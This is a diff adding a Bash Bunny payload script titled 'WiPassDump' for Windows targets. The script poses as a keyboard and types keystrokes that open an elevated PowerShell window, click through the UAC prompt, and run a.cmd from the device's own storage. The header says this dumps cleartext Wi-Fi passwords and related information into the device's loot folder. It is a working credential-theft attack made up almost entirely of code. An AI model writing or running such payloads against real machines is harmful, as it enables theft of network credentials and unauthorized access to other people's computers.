@@ -1,0 +1,55 @@
+#!/bin/bash
+#
+# Title:         WiPassDump
+# Author:        Dax
+# Version:       1.0
+# Target:        Windows
+# 
+# Runs powershell as Administrator
+# Bypasses UAC
+# Dumps cleartext Wi-Fi passwords and infos to the Bash Bunny
+#
+
+LED R 200
+
+ATTACKMODE HID STORAGE
+
+# Source bunny_helpers.sh to get environment variable SWITCH_POSITION
+source bunny_helpers.sh
+
+# Set language accordingly
+Q SET_LANGUAGE ca
+
+# Create directory to dump infos
+mkdir -p /root/udisk/loot/WiPassDump
+
+LED B 200
+
+# Launch powershell as admin
+Q GUI r
+Q DELAY 100
+Q STRING powershell Start-Process powershell -Verb runAs
+Q ENTER
+
+# Bypass UAC
+Q DELAY 3000
+Q ALT o
+Q ENTER
+Q DELAY 500
+
+# Start a.cmd
+Q STRING '.((gwmi win32_volume -f '"'"'label='"''"'BashBunny'"'''"').Name+'"'"'payloads/'
+Q STRING $SWITCH_POSITION
+Q STRING '/a.cmd'"'"')'
+Q ENTER
+
+# Wait for a.cmd to finish and exit
+Q DELAY 3000
+Q STRING exit
+Q ENTER
+
+LED R B 500
+sync
+ATTACKMODE STORAGE
+
+LED G
